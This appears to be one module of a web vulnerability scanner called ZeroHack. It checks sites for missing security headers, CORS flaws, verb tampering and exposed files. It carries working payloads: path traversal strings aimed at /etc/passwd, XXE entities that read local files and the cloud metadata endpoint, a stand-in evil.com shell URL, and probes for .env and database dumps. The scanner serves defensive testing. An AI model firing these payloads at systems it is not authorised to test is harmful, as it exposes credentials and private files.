"""
ZeroHack v2.0 - Additional Vulnerabilities
Covers: CORS misconfiguration, HTTP security headers, LFI/RFI,
        directory traversal, XXE injection, HTTP verb tampering.
"""

import re
from typing import List

from modules.enhanced_scanner import BaseScanner
from modules.notification_system import Finding, print_module_start, print_finding, print_info

# ─────────────────────────────────────────────────────────────
# LFI / Directory traversal payloads
# ─────────────────────────────────────────────────────────────
LFI_PAYLOADS = [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    # Windows
    "..\\windows\\win.ini",
    "..\\..\\windows\\win.ini",
    "..\\..\\..\\windows\\win.ini",
    # Encoded
    "..%2Fetc%2Fpasswd",
    "%2e%2e%2fetc%2fpasswd",
    "..%252Fetc%252Fpasswd",    # Double URL encode
    # Null byte (legacy)
    "../etc/passwd\x00",
    # PHP wrappers
    "php://filter/convert.base64-encode/resource=index.php",
    "php://input",
]

LFI_INDICATORS = [
    "root:x:0:",           # /etc/passwd
    "bin:x:",
    "[extensions]",        # win.ini
    "for 16-bit",
    "<?php",               # PHP source exposure
]

# RFI payloads — point to a response that contains a known string
RFI_TEST_URL   = "http://evil.com/shell.txt"   # Unlikely to exist — used only for detection pattern
RFI_INDICATORS = ["eval(", "system(", "passthru(", "exec("]

# XXE payloads
XXE_PAYLOADS = [
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><data>&xxe;</data>',
    '<?xml version="1.0"?><!DOCTYPE r [<!ELEMENT r ANY><!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><r>&xxe;</r>',
]

# Required security headers
REQUIRED_HEADERS = {
    "Strict-Transport-Security": {
        "severity": "MEDIUM",
        "description": "Missing HSTS header. Clients may connect over plain HTTP.",
        "remediation": "Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
    },
    "Content-Security-Policy": {
        "severity": "MEDIUM",
        "description": "Missing CSP header. XSS attacks are not mitigated by browser policy.",
        "remediation": "Implement a restrictive Content-Security-Policy header.",
    },
    "X-Content-Type-Options": {
        "severity": "LOW",
        "description": "Missing X-Content-Type-Options. MIME sniffing attacks are possible.",
        "remediation": "Add: X-Content-Type-Options: nosniff",
    },
    "X-Frame-Options": {
        "severity": "LOW",
        "description": "Missing X-Frame-Options. Clickjacking attacks may be possible.",
        "remediation": "Add: X-Frame-Options: DENY or SAMEORIGIN",
    },
    "Referrer-Policy": {
        "severity": "LOW",
        "description": "Missing Referrer-Policy. Sensitive URLs may leak via Referer header.",
        "remediation": "Add: Referrer-Policy: no-referrer-when-downgrade",
    },
    "Permissions-Policy": {
        "severity": "LOW",
        "description": "Missing Permissions-Policy header. Browser features are unrestricted.",
        "remediation": "Add a Permissions-Policy to restrict camera, microphone, geolocation, etc.",
    },
}

# Bad values that override good header presence
INSECURE_HEADER_VALUES = {
    "X-Frame-Options": ["ALLOWALL"],
    "Access-Control-Allow-Origin": ["*"],
}


class AdditionalVulnsTester(BaseScanner):
    """
    Tests for CORS misconfig, missing security headers, LFI, XXE,
    HTTP verb tampering, and sensitive file exposure.
    """

    MODULE = "Additional Vulns"

    # Common parameters used for file path inclusion
    FILE_PARAMS = [
        "file", "path", "page", "include", "require", "load",
        "template", "view", "lang", "language", "module", "conf",
        "dir", "show", "document", "folder", "root", "pg", "style",
    ]

    def scan(self, mode: str = "both") -> List[Finding]:
        print_module_start(self.MODULE, self.target)
        self.findings.clear()

        resp = self.get(self.target)
        if not resp:
            return self.get_findings()

        print_info("Checking security headers, CORS, LFI, XXE, verb tampering")

        self._check_security_headers(resp)
        self._check_cors()
        self._check_lfi()
        self._check_xxe()
        self._check_verb_tampering()
        self._check_sensitive_files()

        return self.get_findings()

    # ─────── Security headers ─────────────────────────────────
    def _check_security_headers(self, resp):
        headers_lower = {k.lower(): v for k, v in resp.headers.items()}

        for header, meta in REQUIRED_HEADERS.items():
            if header.lower() not in headers_lower:
                f = self.add_finding(
                    module=self.MODULE,
                    title=f"Missing Security Header: {header}",
                    severity=meta["severity"],
                    description=meta["description"],
                    target=self.target,
                    evidence=f"Header '{header}' not present in response",
                    remediation=meta["remediation"],
                    owasp="A05:2021 – Security Misconfiguration",
                )
                print_finding(f)
            else:
                # Check for known-bad values
                val = headers_lower[header.lower()]
                bad_vals = INSECURE_HEADER_VALUES.get(header, [])
                for bad in bad_vals:
                    if bad.lower() in val.lower():
                        f = self.add_finding(
                            module=self.MODULE,
                            title=f"Insecure Header Value: {header}: {val}",
                            severity="MEDIUM",
                            description=f"The header {header} is set to an insecure value: {val!r}",
                            target=self.target,
                            evidence=f"{header}: {val}",
                            remediation=meta["remediation"],
                            owasp="A05:2021 – Security Misconfiguration",
                        )
                        print_finding(f)

        # Check for server/tech version disclosure
        for h in ["server", "x-powered-by", "x-aspnet-version", "x-aspnetmvc-version"]:
            if h in headers_lower:
                f = self.add_finding(
                    module=self.MODULE,
                    title=f"Technology Version Disclosure ({h.title()})",
                    severity="INFO",
                    description=f"The server discloses technology/version information in the {h.title()} header.",
                    target=self.target,
                    evidence=f"{h.title()}: {headers_lower[h]}",
                    remediation="Remove or obscure server/version headers in your web server config.",
                    owasp="A05:2021 – Security Misconfiguration",
                )
                print_finding(f)

    # ─────── CORS misconfiguration ────────────────────────────
    def _check_cors(self):
        test_origins = [
            "https://evil.com",
            "null",
            f"https://evil.{self.base_host}",
        ]
        for origin in test_origins:
            resp = self.get(self.target, headers={"Origin": origin})
            if not resp:
                continue
            acao = resp.headers.get("Access-Control-Allow-Origin", "")
            acac = resp.headers.get("Access-Control-Allow-Credentials", "").lower()

            if acao == "*":
                f = self.add_finding(
                    module=self.MODULE,
                    title="CORS Wildcard Origin",
                    severity="MEDIUM",
                    description="Access-Control-Allow-Origin: * allows any domain to make cross-origin requests.",
                    target=self.target,
                    evidence=f"Access-Control-Allow-Origin: {acao}",
                    remediation="Set CORS origin to explicit trusted domains. Never use * with credentials.",
                    owasp="A05:2021 – Security Misconfiguration",
                )
                print_finding(f)

            elif acao == origin and acac == "true":
                f = self.add_finding(
                    module=self.MODULE,
                    title="CORS Misconfiguration — Reflected Origin with Credentials",
                    severity="HIGH",
                    description=(
                        f"The server reflects back the attacker's origin ({origin!r}) and allows credentials. "
                        "This allows cross-origin requests that carry session cookies."
                    ),
                    target=self.target,
                    evidence=f"Origin: {origin} → ACAO: {acao} | ACAC: true",
                    remediation="Maintain a strict allowlist of trusted origins. Never reflect arbitrary origins.",
                    owasp="A05:2021 – Security Misconfiguration",
                    cve="CWE-942",
                )
                print_finding(f)

            elif acao == "null" or origin == "null" and acao:
                f = self.add_finding(
                    module=self.MODULE,
                    title="CORS Misconfiguration — Null Origin Accepted",
                    severity="MEDIUM",
                    description="The server accepts 'null' as a trusted origin. Sandboxed iframes can exploit this.",
                    target=self.target,
                    evidence=f"Origin: null → ACAO: {acao}",
                    remediation="Reject 'null' origin in CORS configuration.",
                    owasp="A05:2021 – Security Misconfiguration",
                )
                print_finding(f)

    # ─────── LFI ──────────────────────────────────────────────
    def _check_lfi(self):
        for param in self.FILE_PARAMS:
            for payload in LFI_PAYLOADS:
                url  = self.inject_param(self.target, param, payload)
                resp = self.get(url)
                if not resp:
                    continue
                for indicator in LFI_INDICATORS:
                    if indicator in resp.text:
                        f = self.add_finding(
                            module=self.MODULE,
                            title="Local File Inclusion (LFI)",
                            severity="CRITICAL",
                            description=(
                                f"Parameter '{param}' is vulnerable to LFI. "
                                f"Payload {payload!r} exposed file contents."
                            ),
                            target=url,
                            evidence=f"Indicator {indicator!r} found in response",
                            remediation=(
                                "Never use user input to construct file paths. "
                                "Use a strict allowlist of allowed files/paths. "
                                "Run the web server with minimal OS privileges."
                            ),
                            owasp="A01:2021 – Broken Access Control",
                            cve="CWE-22",
                        )
                        print_finding(f)
                        return  # stop at first confirmed LFI

    # ─────── XXE ──────────────────────────────────────────────
    def _check_xxe(self):
        xxe_headers = {"Content-Type": "application/xml"}
        for payload in XXE_PAYLOADS:
            resp = self.post(self.target, data=payload,
                             headers={**self.session.headers, **xxe_headers})
            if not resp:
                continue
            for indicator in ["root:x:", "[extensions]", "ami-id", "instance-id"]:
                if indicator in resp.text:
                    f = self.add_finding(
                        module=self.MODULE,
                        title="XML External Entity Injection (XXE)",
                        severity="CRITICAL",
                        description=(
                            "The endpoint processes XML with external entity expansion enabled. "
                            "An attacker can read local files or trigger SSRF via XXE."
                        ),
                        target=self.target,
                        evidence=f"XXE indicator {indicator!r} reflected in response",
                        remediation=(
                            "Disable external entity processing in your XML parser. "
                            "Use DISALLOW_DOCTYPE_DECL or equivalent. "
                            "Consider switching to JSON APIs."
                        ),
                        owasp="A05:2021 – Security Misconfiguration",
                        cve="CWE-611",
                    )
                    print_finding(f)
                    return

    # ─────── HTTP verb tampering ──────────────────────────────
    def _check_verb_tampering(self):
        for verb in ["TRACE", "OPTIONS", "PUT", "DELETE", "PATCH"]:
            try:
                resp = self.session.request(verb, self.target, timeout=self.timeout)
                if resp.status_code not in (405, 501, 403):
                    if verb == "TRACE" and "TRACE" in resp.text:
                        f = self.add_finding(
                            module=self.MODULE,
                            title="HTTP TRACE Method Enabled (XST Risk)",
                            severity="LOW",
                            description=(
                                "The server responds to HTTP TRACE requests. "
                                "This can enable Cross-Site Tracing (XST) attacks."
                            ),
                            target=self.target,
                            evidence=f"TRACE → HTTP {resp.status_code}",
                            remediation="Disable TRACE method in your web server configuration.",
                            owasp="A05:2021 – Security Misconfiguration",
                        )
                        print_finding(f)
                    elif verb in ("PUT", "DELETE") and resp.status_code in (200, 201, 204):
                        f = self.add_finding(
                            module=self.MODULE,
                            title=f"Dangerous HTTP Method Allowed: {verb}",
                            severity="HIGH",
                            description=(
                                f"The server accepts {verb} requests on the root path. "
                                "This may allow unauthorized file writes or deletions."
                            ),
                            target=self.target,
                            evidence=f"HTTP {verb} → {resp.status_code}",
                            remediation=f"Disable {verb} method unless explicitly required. Enforce authentication.",
                            owasp="A01:2021 – Broken Access Control",
                        )
                        print_finding(f)
            except Exception:
                pass

    # ─────── Sensitive file exposure ─────────────────────────
    def _check_sensitive_files(self):
        sensitive_paths = [
            "/.git/HEAD", "/.env", "/config.php", "/wp-config.php",
            "/web.config", "/phpinfo.php", "/server-status", "/server-info",
            "/.htaccess", "/robots.txt", "/sitemap.xml", "/.DS_Store",
            "/backup.zip", "/dump.sql", "/database.sql",
            "/admin", "/administrator", "/login", "/wp-admin",
        ]
        for path in sensitive_paths:
            url  = self.join(self.target, path)
            resp = self.get(url)
            if not resp or resp.status_code in (404, 301, 302):
                continue
            if resp.status_code == 200:
                # Extra checks for real exposures
                has_content = len(resp.text) > 30
                is_interesting = any(kw in resp.text.lower() for kw in [
                    "password", "secret", "db_", "api_key", "access_key",
                    "ref: refs/heads", "<?php", "[core]",
                ])
                severity = "HIGH" if is_interesting else "INFO"
                f = self.add_finding(
                    module=self.MODULE,
                    title=f"Sensitive File Exposed: {path}",
                    severity=severity,
                    description=(
                        f"The path {path} is publicly accessible (HTTP {resp.status_code}). "
                        + ("Sensitive content detected." if is_interesting else "Verify content manually.")
                    ),
                    target=url,
                    evidence=f"HTTP {resp.status_code} | {len(resp.text)} bytes",
                    remediation=f"Restrict access to {path} via web server rules or remove the file.",
                    owasp="A05:2021 – Security Misconfiguration",
                )
                print_finding(f)
